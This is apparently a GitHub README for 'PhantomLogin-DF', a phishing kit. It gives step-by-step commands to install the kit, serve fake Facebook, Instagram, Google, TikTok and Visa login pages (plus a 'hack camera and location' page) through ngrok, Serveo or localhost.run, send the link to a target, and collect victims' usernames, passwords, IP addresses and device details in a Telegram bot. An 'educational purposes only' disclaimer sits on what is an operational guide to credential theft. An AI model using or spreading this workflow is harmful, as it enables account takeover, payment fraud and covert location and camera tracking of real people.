# PhantomLogin-DF
#آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم


## **PhantomLogin-DF Usage Guide**

**PhantomLogin-DF** is a powerful tool designed to create phishing pages for educational and security purposes. It supports multiple services like `ngrok`, `Serveo.net`, and `localhost.run` to expose the pages to the internet. Below is a detailed step-by-step guide on how to use the tool.

---

### **Step 1: Download the Tool**
```bash
 git clone https://github.com/MohamedAbuAl-Saud/PhantomLogin-DF.git
```
1. **Clone the Repository**:
   Open your terminal and run the following command to download the tool:
   ```bash
   git clone https://github.com/MohamedAbuAl-Saud/PhantomLogin-DF.git
   
   cd PhantomLogin-DF
   
   chmod +x install.sh
 
   bash install.sh

   ./phantomlogin.sh
   ```
   

2. **Navigate to the Tool's Directory**:
   Move into the tool's directory using:
   ```bash
   cd PhantomLogin-DF
   ```

---

### **Step 2: Install Dependencies**

1. **Install Python 3**:
   - On Linux/macOS:
     ```bash
     sudo apt update
     sudo apt install python3 -y
     ```
   - On Windows: Download and install Python from [python.org](https://www.python.org/).

2. **Install SSH** (Required for Serveo.net and localhost.run):
   - On Linux/macOS:
     ```bash
     sudo apt install openssh-client -y
     ```
   - On Windows: SSH is included in Git Bash or WSL.

3. **Install ngrok** (Optional but recommended):
   - Download ngrok from [ngrok.com](https://ngrok.com/download).
   - Follow the installation instructions for your operating system.

---

### **Step 3: Run the Installation Script**

1. **Make the Script Executable**:
   Run the following command to make the installation script executable:
   ```bash
   chmod +x install.sh
   ```

2. **Run the Installation Script**:
   Execute the script to install the required tools:
   ```bash
   ./install.sh
   ```

3. **Follow the Prompts**:
   The script will ask you to choose which tools to install (`ngrok`, `Serveo.net`, `localhost.run`, or all). Confirm with `y` or `n` as needed.

---

### **Step 4: Run the Tool**

1. **Start the Tool**:
   Run the following command to start the tool:
   ```bash
   ./phantomlogin.sh
   ```

2. **Enter Your Telegram Bot Token and Chat ID**:
   - You will be prompted to enter your Telegram Bot Token and Chat ID. These are required to send captured data to your Telegram account.
   - If you don't have a Telegram Bot, create one using [BotFather](https://core.telegram.org/bots#botfather).

3. **Choose a Phishing Page**:
   - The tool will display a menu of available phishing pages (e.g., Facebook, Instagram, Google, TikTok, Visa).
   - Enter the number corresponding to the page you want to create.

4. **Choose a Service to Expose the Page**:
   - The tool will ask you to choose a service to expose the page:
     - **ngrok**: Fast and easy service to expose the page.
     - **Serveo.net**: Free service that uses SSH.
     - **localhost.run**: Free service that uses SSH.
     - **localhost**: Run the page locally (only accessible on your machine).
   - Enter the corresponding number for your choice.

5. **Get the Link**:
   - After selecting the service, the tool will generate a link (e.g., `https://abcd1234.ngrok.io`).
   - Share this link with the target (for educational purposes only).

---

### **Step 5: Monitor Captured Data**

1. **Check Your Telegram**:
   - Any data entered on the phishing page (e.g., username, password) will be sent to your Telegram Bot.
   - You will also receive device information like IP address, battery level, and network type.

2. **Stop the Tool**:
   - Press `Ctrl+C` in the terminal to stop the tool and close the server.

---

### **Example Walkthrough**

```bash
$ ./phantomlogin.sh
Welcome to PhantomLogin-DF!
Enter Token: YOUR_TELEGRAM_BOT_TOKEN
Enter ID: YOUR_TELEGRAM_CHAT_ID

Choose the page you want to phish:
1. Facebook
2. TikTok
3. Instagram
4. Google
5. Visa
6. Hack camera and location
Enter your choice: 1

Do you want to use ngrok, localhost.run, serveo.net, or localhost? (n/l/s/h): n
Starting ngrok...
Ngrok URL: https://abcd1234.ngrok.io/Facebook_login.html
```

---

### **Troubleshooting**

1. **ngrok Not Working**:
   - Ensure ngrok is installed and authenticated. Run `ngrok authtoken YOUR_AUTH_TOKEN`.

2. **SSH Not Installed**:
   - Install SSH using:
     ```bash
     sudo apt install openssh-client
     ```

3. **Link Not Accessible**:
   - Check your internet connection and ensure the service is running.

4. **Data Not Sent to Telegram**:
   - Verify that the Telegram Bot Token and Chat ID are correct.

---


---

## **What is `pyngrok`?**

`pyngrok` is a Python library that allows you to control **ngrok** through Python code. It acts as a Python wrapper for **ngrok**, making it easy to create and manage tunnels programmatically.

---

## **Role of `pyngrok` in the Tool**

1. **Create a Tunnel**:
   - `pyngrok` is used to create a tunnel between your local machine and the internet, allowing you to expose pages running on `localhost` to the outside world.

2. **Generate Public Links**:
   - It generates a public URL (e.g., `https://abcd1234.ngrok.io`) that anyone can access.

3. **Manage Tunnels**:
   - You can easily manage tunnels (open, close, or modify them) using `pyngrok`.

---

## **Is `pyngrok` Required?**

- **Yes**, if you want to use **ngrok** to expose pages to the internet.
- **No**, if you prefer to use other services like **Serveo.net** or **localhost.run**, as these services rely on **SSH** and do not require `pyngrok`.

---

## **How to Install `pyngrok`**

1. **Install `pyngrok` via `pip`**:
   ```bash
   pip install pyngrok
   ```

2. **Ensure `ngrok` is Installed**:
   - `pyngrok` requires **ngrok** to be installed on your system.
   - Download **ngrok** from [here](https://ngrok.com/download) and follow the installation instructions.

3. **Add Your Auth Token**:
   - After installing **ngrok**, add your auth token using the following command:
     ```bash
     ngrok authtoken YOUR_AUTH_TOKEN
     ```

---

## **Example of Using `pyngrok` in Code**

```python
from pyngrok import ngrok

# Create a tunnel on port 8000
public_url = ngrok.connect(8000)
print("Public URL:", public_url)

# Close the tunnel
ngrok.kill()
```

---

## **Alternatives to `pyngrok`**

If you don’t want to use **ngrok**, you can rely on the following services:

1. **Serveo.net**:
   - Relies on SSH and does not require any additional libraries.
   - Use it with the following command:
     ```bash
     ssh -R 80:localhost:8000 serveo.net
     ```

2. **localhost.run**:
   - Also relies on SSH.
   - Use it with the following command:
     ```bash
     ssh -R 80:localhost:8000 localhost.run
     ```

---

## **Conclusion**

- `pyngrok` is essential if you want to use **ngrok** in the tool.
- If you prefer to use other services like **Serveo.net** or **localhost.run**, you do not need `pyngrok`.

---
  
---

### **Developer Information**

- **Name**: Muhammad Abu Al-Saud
- **Channel**: [cybersecurityTemDF](https://t.me/cybersecurityTemDF)
- **Contact**: [@A_Y_TR](https://t.me/A_Y_TR)

---

### **License**

This tool is licensed under the [MIT License](LICENSE). Use it responsibly and only for educational or security purposes.

---

### **Disclaimer**

This tool is intended for educational and security purposes only. Do not use it for any illegal or harmful activities. The developer is not responsible for any misuse of the tool.

---

### **Acknowledgments**

Thank you for using **PhantomLogin-DF**! If you have any questions or suggestions, feel free to contact the developer.

---

This guide provides a comprehensive explanation of how to use **PhantomLogin-DF**. If you need further assistance, don't hesitate to ask To communicate via Telegram...! 
